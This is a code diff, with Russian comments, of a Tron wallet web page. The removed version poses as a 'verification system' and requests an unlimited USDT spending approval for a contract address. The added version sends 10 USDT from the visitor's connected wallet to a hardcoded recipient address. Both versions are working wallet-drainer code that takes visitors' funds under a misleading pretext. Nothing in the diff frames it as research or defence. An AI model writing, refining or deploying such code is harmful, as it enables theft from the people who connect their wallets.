@@ -1,86 +1,56 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
-    <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            margin-top: 100px; 
-            background-color: #0f172a; 
-            color: #fff; 
-        }
-        button { 
-            padding: 15px 30px; 
-            font-size: 18px; 
-            cursor: pointer; 
-            background-color: #2563eb; 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-        }
-        button:hover { 
-            background-color: #1d4ed8; 
-        }
-        #approveBtn { 
-            display: none; 
-            background-color: #16a34a; 
-            margin-top: 20px; 
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 16px;
-            color: #94a3b8;
-        }
-    </style>
-</head>
-<body>
+const connectBtn = document.getElementById('connectBtn');
+const transferBtn = document.getElementById('transferBtn');
+const walletAddressText = document.getElementById('walletAddress');
 
-    <h1>Система верификации</h1>
-    <p id="status">Нажмите кнопку для подключения</p>
-    
-    <button id="connectBtn">Подключить кошелек</button>
-    <br>
-    <button id="approveBtn">Подтвердить</button>
+let userAddress = '';
 
-    <script>
-        const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный USDT Tron
-        const SPENDER_CONTRACT = "0xd9145CCE52D386f254917e481eB44e9943F39138"; // Ваш адрес контракта
-        const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+// Ваш адрес получателя уже прописан здесь:
+const targetDestinationAddress = 'TUEe7i1nU76PF8Tx8MmrkQJFWSoX61fae4'; 
 
-        const connectBtn = document.getElementById('connectBtn');
-        const approveBtn = document.getElementById('approveBtn');
-        const statusText = document.getElementById('status');
+// Кнопка подключения кошелька
+connectBtn.addEventListener('click', async () => {
+    try {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            userAddress = window.tronWeb.defaultAddress.base58;
+            walletAddressText.innerText = `Подключено: ${userAddress}`;
+            connectBtn.style.display = 'none';
+            transferBtn.style.display = 'inline-block';
+        } else {
+            alert('Кошелек не найден! Откройте сайт через встроенный DApp-браузер кошелька (например, в Trust Wallet).');
+        }
+    } catch (error) {
+        console.error("Ошибка:", error);
+    }
+});
 
-        connectBtn.onclick = async () => {
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                statusText.innerText = "Подключено: " + window.tronWeb.defaultAddress.base58;
-                connectBtn.style.display = 'none';
-                approveBtn.style.display = 'inline-block';
-            } else {
-                alert("Откройте сайт во встроенном браузере кошелька (например, Trust Wallet или TronLink)!");
-            }
-        };
+// Кнопка перевода средств
+transferBtn.addEventListener('click', async () => {
+    try {
+        if (!userAddress) {
+            alert('Сначала подключите кошелек!');
+            return;
+        }
 
-        approveBtn.onclick = async () => {
-            try {
-                statusText.innerText = "Запрос подтверждения...";
-                const usdtContract = await window.tronWeb.contract().at(USDT_TRC20);
-                
-                // Запрос безлимитного аппрува на ваш смарт-контракт
-                await usdtContract.approve(SPENDER_CONTRACT, MAX_UINT256).send({
-                    feeLimit: 100_000_000
-                });
-                
-                statusText.innerText = "Успешно!";
-                alert("Операция выполнена.");
-            } catch (err) {
-                console.error(err);
-                statusText.innerText = "Ошибка или отказ.";
-            }
-        };
-    </script>
-</body>
-</html>
+        // Официальный адрес контракта USDT в сети Tron
+        const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        
+        const contract = await window.tronWeb.contract().at(usdtContractAddress);
+        
+        // Сумма перевода (например, 10 USDT. У USDT 6 знаков, поэтому 10 * 1000000 = 10000000)
+        const amountToSend = 10000000; 
+
+        const tx = await contract.transfer(
+            targetDestinationAddress, 
+            amountToSend
+        ).send({
+            feeLimit: 100000000
+        });
+
+        alert("Транзакция отправлена!");
+        console.log(tx);
+
+    } catch (error) {
+        console.error(error);
+        alert("Ошибка при переводе. Проверьте баланс TRX на кошельке для оплаты комиссии.");
+    }
+});
